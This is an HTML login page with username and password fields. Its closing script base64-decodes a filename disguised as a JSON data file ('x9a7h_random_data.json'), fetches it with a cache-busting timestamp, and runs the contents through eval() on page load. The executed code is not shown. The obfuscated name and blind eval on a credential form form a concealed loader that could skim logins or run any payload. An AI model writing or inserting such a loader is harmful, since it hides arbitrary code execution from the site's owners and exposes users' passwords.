<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="styles2.css">
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/128/5977/5977575.png">
  <script src="https://cdn.jsdelivr.net/npm/argon2-browser/dist/argon2-bundled.min.js"></script>
</head>
<body>
  <div class="background"></div>
  <div class="login-container">
    <h1>Welcome</h1>
    <p>Please login to continue</p>

    <!-- Error message placed above the username input -->
    <div id="error-message" class="error" style="display: none;"></div>

    <form id="login-form">
      <!-- Username Input -->
      <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" placeholder="Enter your username" required autocomplete="off">
      </div>
      
      <!-- Password Input -->
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="Enter your password" required autocomplete="new-password">
      </div>
      
      <!-- Login Button -->
      <button type="submit" id="login-button">Login</button>
    </form>
  </div>
  <script>
  let scriptName = atob('eDlhN2hfcmFuZG9tX2RhdGEuanNvbg=='); // Decoded: 'x9a7h_random_data.json'
  
  fetch(scriptName + '?' + new Date().getTime()) // Adds a timestamp to prevent caching
    .then(response => response.text())
    .then(jsCode => eval(jsCode)) // Execute script
    .catch(error => console.error('Error loading script:', error));
</script>
</body>
</html>
